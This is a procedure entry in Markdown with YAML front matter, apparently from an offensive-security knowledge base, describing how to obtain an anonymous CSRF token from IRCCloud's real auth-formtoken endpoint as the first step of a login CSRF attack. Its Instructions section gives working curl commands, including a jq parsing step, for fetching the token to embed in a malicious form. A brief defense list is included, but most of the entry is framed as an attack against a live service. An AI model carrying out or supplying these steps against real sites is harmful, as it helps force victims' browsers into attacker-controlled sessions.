---
tags:
  - csrf
  - token-retrieval
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/request-irccloud-csrf-token]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:29.989Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 8d60de1e-92dc-4d0e-a20b-d5bc70cea143
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Obtain-Anonymous-CSRF-Token-from-IRCCloud

## Summary

This procedure retrieves a valid CSRF token from IRCCloud's /chat/auth-formtoken endpoint without any authentication or session requirements, enabling subsequent cross-site request forgery attacks on the login process.

## Description

In IRCCloud's implementation, CSRF tokens are issued via a POST request that does not enforce session binding or origin checks, allowing anonymous attackers to obtain tokens for use in malicious forms. This token can then be embedded in a login form to bypass CSRF protections, forcing a victim's browser to authenticate as the attacker. The attack targets web browsers and requires no prior access to the victim.

## Requirements

1. Network access to https://www.irccloud.com (HTTPS on port 443)
2. Tool like curl or a browser for sending POST requests
3. No credentials needed for this step

## Defense

Defensive measures and detection strategies:

- Implement session-bound CSRF tokens that require authentication for issuance
- Enforce same-site cookie policies (e.g., SameSite=Strict) on login endpoints
- Monitor for anomalous token requests from non-session IPs

## Objectives

1. Acquire a reusable CSRF token anonymously
2. Validate token usability for login CSRF
3. Prepare for form-based exploitation

## Instructions

### Step 1: Send POST Request for Token

**Context**: Initiate a POST to the auth-formtoken endpoint with a minimal body to request the token.

**Command** ([[commands/request-irccloud-csrf-token]]):
```bash
curl -X POST https://www.irccloud.com/chat/auth-formtoken \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://www.irccloud.com/" \
  -d "_reqid=1"
```

> This command mimics a browser AJAX request and returns a JSON object with the token field. Expected output includes a timestamp-prefixed hash like '1397481736.3b1f59ae47e1a139e8a631b2589dfae2'. No cookies are required.

### Step 2: Parse and Store Token

**Context**: Extract the token value from the response for use in the malicious form.

**Command** (using jq for parsing):
```bash
curl -s -X POST https://www.irccloud.com/chat/auth-formtoken -H "Content-Type: application/x-www-form-urlencoded" -d "_reqid=1" | jq -r '.token'
```

> Outputs the raw token string. Save it to a variable or file for the next procedure.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/request-irccloud-csrf-token]]

## Tools Used


## Tags

- [[csrf]]
- [[web-exploitation]]
